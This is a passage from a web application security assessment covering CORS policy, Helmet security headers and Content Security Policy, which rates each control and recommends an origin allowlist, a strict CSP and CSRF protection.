- [6.8.1 CORS Policy](#cors-policy)
- [6.8.2 Security Headers](#security-headers)
- [6.8.3 Content Security Policy](#content-security-policy)

**Implemented controls:** `helmet` is registered in `server.ts`, providing `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, HSTS, and several additional default headers. CORS middleware is globally applied via `app.use(cors())`.

**Assessment:** Helmet provides a baseline of response headers, but the CORS policy is permissive (reflecting or allowing any origin), a Content Security Policy is absent or insufficient to block the known XSS sinks, and no CSRF token or origin-check mechanism exists for state-changing API calls. The missing CSRF protection is the primary driver of the 🔴 Missing verdict for this section.

<a id="cors-policy"></a>
#### 6.8.1 CORS Policy

**Status:** 🟠 Weak - CORS middleware is registered globally, but the absence of an explicit origin allowlist means any origin receives a permissive `Access-Control-Allow-Origin` response.

`app.use(cors())` in `server.ts` registers CORS handling for all routes. With no options object passed, the `cors` package defaults to reflecting the incoming `Origin` header or allowing any origin.

**Security assessment**

A permissive CORS policy allows any web page to issue cross-origin requests to the API and read the response. Combined with the absent CSRF protection, a cross-origin page can issue state-changing requests that the browser will accompany with any cookies set on the application domain. The policy should restrict `Access-Control-Allow-Origin` to the known frontend origin and set `Access-Control-Allow-Credentials: true` only when that restriction is in place.

**Relevant findings**

- No dedicated finding routed in this assessment.

<a id="security-headers"></a><a id="security-headers-helmet"></a>
#### 6.8.2 Security Headers

**Status:** 🟡 Partial - Helmet provides several useful default headers, but the absence of a Content Security Policy leaves the browser without a last-resort XSS mitigation.

`helmet` is registered in `server.ts` and automatically sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Strict-Transport-Security` (HSTS), `X-DNS-Prefetch-Control`, and related headers on all responses.

**Security assessment**

Helmet's `noSniff` and `frameguard` headers prevent MIME sniffing and clickjacking respectively, and HSTS enforces HTTPS on supporting clients. Helmet's default configuration does not include `Content-Security-Policy`. Without CSP, the browser applies no source restriction on which scripts are allowed to execute, leaving no browser-level defence against the confirmed `bypassSecurityTrustHtml()` XSS sinks. Enabling Helmet's `contentSecurityPolicy` option with a strict `script-src` directive would add a meaningful defence-in-depth layer.

**Relevant findings**

- No dedicated finding routed in this assessment.

<a id="content-security-policy"></a>
#### 6.8.3 Content Security Policy

**Status:** 🟡 Partial - a CSP may be present via Angular's build output, but the structural conflict between `bypassSecurityTrustHtml()` usage and a strict `script-src` makes the effective policy insufficient to block the known XSS sinks.

Angular applications can emit a `Content-Security-Policy` header or `<meta>` tag either from the build configuration or from the Express server. The policy restricts which script origins, inline scripts, and `eval()` usages the browser will execute.

**Security assessment**

The use of `bypassSecurityTrustHtml()` at multiple SPA call sites injects arbitrary HTML - including potential `<script>` elements and event-handler attributes - into the rendered page. A strict CSP with `script-src: 'self'` and no `unsafe-inline` would block injected inline scripts, but Angular's SPA bootstrap typically requires either a nonce-based or hash-based allowlist for its own bootstrapping scripts. Without confirmed enforcement of a policy strict enough to cover the confirmed XSS sinks, this control is at best partial. The missing Helmet `contentSecurityPolicy` default confirms no server-set policy is enforced.

**Relevant findings**

- No dedicated finding routed in this assessment.

_Additional cataloged controls without a dedicated subsection (no implementation prose and no linked findings): CSRF Protection._

### 6.9 Cryptography Secrets and Data Protection
